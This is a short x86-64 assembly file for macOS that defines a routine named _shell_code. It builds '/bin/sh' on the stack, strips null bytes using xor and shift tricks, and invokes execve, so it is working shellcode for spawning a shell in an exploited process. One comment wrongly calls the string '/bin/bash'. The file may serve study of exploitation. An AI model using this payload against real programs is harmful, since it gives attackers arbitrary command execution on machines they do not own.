%define SYSCALL(n) (0x2000000 | n)
%define WRITE 4
%define EXECVE 59

section .text

;;	'/bin/sh', 0
global _shell_code
_shell_code:
	add rsp, 16
	mov rax, 0xff68732f6e69622f ;initial string '/bin/bash'

	xor rsi, rsi
	mov sil, 0xff
	shl rsi, 56
	not rsi
	and rax, rsi 				;add the NULL byte to the string

	push rax
	sub rsp, 8

	xor rax, rax
	xor rsi, rsi
	mov sil, 0x2
	shl rsi, 24
	mov al, 59
	or	rax, rsi 				;mov rax, SYSCALL(EXECVE)

	lea rdi, [rel rsp + 8]

	xor rsi, rsi

	xor rdx, rdx
	syscall

	; add rsp, 16
	; pop rbp
	; ret
